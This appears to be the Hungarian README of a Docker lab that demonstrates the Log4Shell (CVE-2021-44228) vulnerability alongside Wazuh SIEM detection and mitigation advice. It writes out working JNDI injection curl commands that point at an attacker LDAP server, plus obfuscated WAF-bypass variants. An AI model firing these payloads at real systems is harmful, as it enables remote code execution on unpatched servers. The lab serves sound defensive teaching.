# Log4Shell (CVE-2021-44228) Démó Labor

> **⚠️ FIGYELMEZTETÉS**: Ez a labor kizárólag oktatási és biztonsági tudatosság növelési célra készült.
> A tartalmakat SOHA ne használd éles rendszereken vagy engedély nélküli hálózatokon!

## Architektúra

```
┌─────────────────────────────────────────────────────────┐
│                   demo-net (172.20.0.0/24)               │
│                                                           │
│  ┌─────────────┐    ① JNDI     ┌──────────────────────┐ │
│  │   TÁMADÓ    │──────payload──▶│    ÁLDOZAT           │ │
│  │ 172.20.0.10 │◀──② LDAP─────│  vulnerable-app      │ │
│  │ LDAP :1389  │──③ class─────▶│  Log4j 2.14.1        │ │
│  │ HTTP :8888  │                │  172.20.0.20:8080    │ │
│  └─────────────┘                │     │ Wazuh Agent    │ │
│                                 └─────┼────────────────┘ │
│  ┌──────────────────────────────┐     │ ④ log + alert    │
│  │      WAZUH SIEM              │◀────┘                  │
│  │  Manager    172.20.0.30:1514 │                        │
│  │  Indexer    172.20.0.31:9200 │                        │
│  │  Dashboard  172.20.0.32:5601 │                        │
│  └──────────────────────────────┘                        │
└─────────────────────────────────────────────────────────┘
```

## Gyors indítás

### 1. Előfeltételek

```bash
docker --version   # 20.10+
docker compose version  # 2.0+
```

### 2. Labor indítása

```bash
# Klónozás / könyvtárba lépés
cd log4shell-demo

# Összes konténer buildelése és indítása
docker compose up --build -d

# Indítás követése
docker compose logs -f
```

### 3. Elérhető felületek

| Szolgáltatás | URL | Hitelesítés |
|---|---|---|
| Sebezhető alkalmazás | http://localhost:8080 | – |
| Wazuh Dashboard | https://localhost:5601 | admin / SecretPassword |
| Wazuh API | https://localhost:55000 | wazuh / MyS3cur3P4ssw0rd! |

---

## A Demó végrehajtása

### Lépés 1 – Normál forgalom megfigyelése

```bash
# Normál HTTP kérés küldése
curl http://localhost:8080/api/hello

# Alkalmazás logjai – semmi gyanús
docker logs vulnerable-app --tail 20
```

### Lépés 2 – Exploit elküldése

```bash
# Módszer A: Beépített attack szkript
docker exec attacker bash /attacker/attack.sh

# Módszer B: Közvetlen curl (User-Agent fejlécben)
curl -H 'User-Agent: ${jndi:ldap://172.20.0.10:1389/exploit}' \
     http://localhost:8080/api/hello

# Módszer C: X-Forwarded-For fejléc
curl -H 'X-Forwarded-For: ${jndi:ldap://172.20.0.10:1389/exploit}' \
     http://localhost:8080/api/hello

# Módszer D: Login endpoint (username paraméterben)
curl -X POST "http://localhost:8080/api/login" \
     --data 'username=${jndi:ldap://172.20.0.10:1389/exploit}'
```

### Lépés 3 – Eredmények ellenőrzése

```bash
# 1. Exploit sikerességének ellenőrzése
docker exec vulnerable-app cat /tmp/PWNED_by_log4shell.txt

# 2. Alkalmazás logok – JNDI lookup megjelenik
docker logs vulnerable-app | grep -i "jndi\|EXPLOIT\|User-Agent"

# 3. Támadó LDAP szerver logjai
docker logs attacker | grep -i "lookup\|EXPLOIT\|letölt"

# 4. Wazuh riasztások (CLI)
docker exec wazuh-manager tail -f /var/ossec/logs/alerts/alerts.json | \
    python3 -m json.tool | grep -A5 "log4shell\|jndi\|CVE-2021"
```

### Lépés 4 – Wazuh Dashboard

1. Nyisd meg: **https://localhost:5601**
2. Bejelentkezés: `admin` / `SecretPassword`
3. Navigálás: **Threat Intelligence → Security Events**
4. Keresés: `rule.groups: log4shell`
5. Szabály ID-k: `100001` – `100007`

---

## Obfuszkált payloadok (bypass technikák)

A Log4j lookup engine egymásba ágyazható, ami WAF bypass-t tesz lehetővé:

```bash
# Kis/nagybetű bypass
curl -H 'User-Agent: ${${lower:j}ndi:${lower:l}dap://172.20.0.10:1389/x}' \
     http://localhost:8080/api/hello

# Empty string bypass
curl -H 'User-Agent: ${j${::-}ndi:ldap://172.20.0.10:1389/x}' \
     http://localhost:8080/api/hello

# URL encoding kombináció
curl -H 'User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://172.20.0.10:1389/x}' \
     http://localhost:8080/api/hello
```

---

## A sérülékenység magyarázata

### Miért sérülékeny a Log4j 2.14.1?

A Log4j 2.x alapértelmezetten feldolgozza a **Message Lookup** kifejezéseket:

```java
// Sérülékeny kód – a userAgent tartalmazhat ${jndi:...}-t
logger.info("User-Agent: {}", userAgent);

// Ha userAgent = "${jndi:ldap://attacker:1389/x}"
// A Log4j elvégzi az LDAP lookupot és végrehajtja a kapott Java class-t!
```

### Javítás (mitigáció)

| Módszer | Megvalósítás |
|---|---|
| Log4j frissítése | log4j-core ≥ 2.17.1 |
| JVM flag | `-Dlog4j2.formatMsgNoLookups=true` |
| Java frissítése | JDK ≥ 8u191, 11.0.1 (trustURLCodebase=false) |
| WAF szabály | Blokkolás: `${jndi:` mintára |
| Hálózati szegmentálás | Kimenő LDAP/RMI blokkolás |

---

## Labor leállítása

```bash
# Leállítás és takarítás
docker compose down -v

# Összes labor adat törlése
docker compose down -v --rmi local
```

---

## Referenciák

- [NVD CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisories](https://logging.apache.org/log4j/2.x/security.html)
- [Wazuh Log4Shell Detection](https://wazuh.com/blog/detecting-log4shell-with-wazuh/)
- [CISA Log4Shell Guidance](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
